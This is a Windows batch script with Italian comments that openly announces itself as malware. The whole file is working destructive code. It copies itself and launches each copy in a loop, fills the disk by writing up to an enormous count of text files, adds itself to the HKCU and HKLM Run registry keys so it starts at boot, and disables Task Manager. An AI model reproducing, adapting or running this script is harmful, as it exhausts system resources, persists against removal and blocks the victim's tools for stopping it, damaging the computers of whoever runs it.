@echo off
setlocal

echo (THIS IS A MALWARE, CLOSE IT HERE IF YOU DON'T WANT YOUR COMPUTER TO DIE!)
:: Nome del file batch
set BATCH_FILE=%~nx0

:: Directory del file batch
set DEST_DIR=%~dp0

:loop
:: Attendi che l'utente prema un tasto
:: pause >nul

:: Genera un nome unico per la copia
set "TIMESTAMP=%date:~-4%%date:~3,2%%date:~0,2%_%time:~0,2%%time:~3,2%%time:~6,2%"
set "DEST_FILE=%DEST_DIR%\%BATCH_FILE%_%TIMESTAMP%.bat"

:: Copia il file batch nella stessa directory
copy "%~f0" "%DEST_FILE%" >nul

:: Esegui la copia del file batch
start "" "%DEST_FILE%"

:: Creazione di numerosi file per saturare lo spazio su disco
for /L %%A in (1,1,1000000000000000000) do (
    echo Questo è un file di esempio %%A > "%DEST_DIR%\file_malvagio_%%A.txt"
)

:: Modifica del registro di sistema per aggiungere il file batch all'avvio
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript" /t REG_SZ /d "%DEST_FILE%" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousScript" /t REG_SZ /d "%DEST_FILE%" /f

:: Disabilitazione del Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

:: Torna all'inizio del ciclo
goto loop

endlocal
